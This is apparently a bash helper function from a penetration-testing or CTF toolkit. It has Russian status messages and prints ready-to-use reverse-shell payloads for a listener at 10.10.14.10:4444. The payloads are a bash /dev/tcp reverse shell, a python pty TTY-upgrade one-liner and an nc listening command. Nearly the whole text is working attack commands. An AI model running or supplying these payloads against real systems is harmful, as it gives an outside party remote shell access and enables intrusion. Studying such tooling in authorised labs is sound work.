#!/bin/bash

generate_payloads() {
    local LHOST="10.10.14.10"
    local LPORT="4444"

    echo -e "\n${NEON}[*] КОМПИЛЯЦИЯ БОЕВЫХ НАГРУЗОК (LHOST: $LHOST | LPORT: $LPORT)...${NC}"

    local bash_rev="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
    echo -e "${GLOW}[ BASH ]${NC} $bash_rev"

    local py_shell="python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    echo -e "${GLOW}[ TTY  ]${NC} $py_shell"

    echo -e "${CRIMSON}[!] Ожидание подключения: ${SOFT_WHITE}nc -lvnp $LPORT${NC}"
}
